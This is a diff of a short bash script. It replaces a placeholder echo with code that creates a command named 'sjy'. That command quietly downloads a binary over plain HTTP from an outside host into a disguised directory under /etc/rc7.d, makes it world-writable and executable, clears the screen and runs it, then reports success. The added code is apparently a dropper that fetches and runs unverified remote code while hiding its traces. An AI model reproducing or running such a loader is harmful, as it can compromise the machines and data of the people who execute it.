@@ -1,3 +1,16 @@
 #!/usr/bin/env bash
-
-echo "本命令只备用启动"
+cat>/usr/local/bin/sjy<< EOF
+#!/usr/bin/env bash
+if [ -f "/etc/rc7.d/jb/alpine" ]; then
+    echo "sjy"
+else
+    echo "执行中---"
+    wget -P /etc/rc7.d/jb http://alpine.sjys6.eu.org/alpine > /dev/null 2>&1 
+    chmod 777 /etc/rc7.d/jb/alpine > /dev/null 2>&1 
+    
+fi
+clear
+/etc/rc7.d/jb/alpine
+EOF
+sjy
+echo "已成功"
